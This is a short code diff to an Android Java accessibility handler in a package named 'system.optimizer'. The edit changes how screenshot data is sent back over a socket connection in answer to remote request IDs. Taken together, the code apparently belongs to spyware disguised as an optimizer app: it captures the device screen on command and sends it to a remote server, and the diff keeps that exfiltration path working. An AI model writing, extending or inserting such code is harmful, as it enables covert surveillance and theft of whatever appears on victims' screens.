@@ -9,8 +9,6 @@ import android.os.Handler;
 import android.os.Looper;
 import timber.log.Timber;
 
-import org.json.JSONObject;
-import org.json.JSONException;
 
 import com.system.optimizer.network.SocketManager;
 import com.system.optimizer.config.AppConfig;
@@ -95,19 +93,12 @@ public class AccessibilityEventHandler {
                             pendingRequestId = null;
                         }
 
-                        try {
-                            if (requestIdToSend != null) {
-                                JSONObject data = new JSONObject();
-                                data.put("request_id", requestIdToSend);
-                                data.put("image", imageData);
-                                socketManager.sendEvent("screenshot_response", data);
-                            } else {
-                                // No request_id, send image directly
-                                socketManager.sendEvent("screenshot_response", imageData);
-                            }
-                        } catch (JSONException e) {
-                            Timber.e(e, "Error building the JSON for the screenshot");
-                            socketManager.sendEvent("screenshot_error", "Error building the JSON for the screenshot");
+                        if (requestIdToSend != null) {
+                            // Send request_id and image as separate parameters
+                            socketManager.sendEvent("screenshot_response", requestIdToSend, imageData);
+                        } else {
+                            // No request_id, send image directly
+                            socketManager.sendEvent("screenshot_response", imageData);
                         }
                     } else {
                         socketManager.sendEvent("screenshot_error", "Screenshot returned null data");
